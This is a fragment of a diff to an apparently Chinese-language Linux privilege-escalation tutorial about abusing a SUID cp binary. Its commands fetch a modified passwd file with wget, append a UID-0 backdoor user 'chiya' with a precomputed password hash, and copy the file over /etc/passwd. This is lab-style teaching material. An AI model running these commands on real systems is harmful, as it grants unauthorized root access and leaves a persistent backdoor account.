@@ -52,12 +52,15 @@ ls -la /bin/cp
 # 在本地主机上开启8000端口后，在目标主机上使用 `wget` 下载添加新用户后的 `passwd` 文件
 cd /tmp
 wget http://192.168.0.16:8000/passwd
+# 这里其实不必传输passwd文件从本机到目标主机（test用户可以在某个目录下具有写权限的前提下，也就是说可以直接在目标主机上修改passwd副本）
+# 在使用test用户（没有root权限）登录目标主机时，使用`cp`命令将`/etc/passwd`文件复制到`/tmp`下，使用`echo "chiya:\$1\$ignite\$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash" >> passwd`添加到文件里，然后再替换掉系统中原来的文件
 ```
 
 ```bash
 # 使用 `cp` 命令，将源文件的内容复制到目标文件
 cp passwd /etc/passwd
 tail /etc/passwd
+# chiya:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash
 ```
 
 ```bash
